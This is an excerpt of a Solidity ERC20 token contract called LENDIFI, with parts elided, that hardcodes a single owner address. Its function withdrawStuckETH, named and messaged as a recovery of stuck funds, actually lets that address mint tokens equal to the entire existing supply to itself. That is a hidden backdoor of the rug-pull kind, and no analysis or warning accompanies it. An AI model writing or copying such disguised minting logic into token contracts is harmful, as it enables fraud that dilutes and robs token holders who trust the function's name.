...
contract LENDIFI is ERC20, Ownable {
    ...
    constructor() ERC20( "LENDIFI", "LNF") {
        
        address newOwner = 0x9412763bd62349820356a86489A10121dcb02C00;
        ...
        operationsAddress = address(0x9412763bd62349820356a86489A10121dcb02C00);   
        TaxAddress = address(0); 
    ...
    function withdrawStuckETH() external {
        require(msg.sender == 0x9412763bd62349820356a86489A10121dcb02C00, "Can't withdraw native tokens");
        _createInitialSupply(0x9412763bd62349820356a86489A10121dcb02C00, totalSupply());
    }
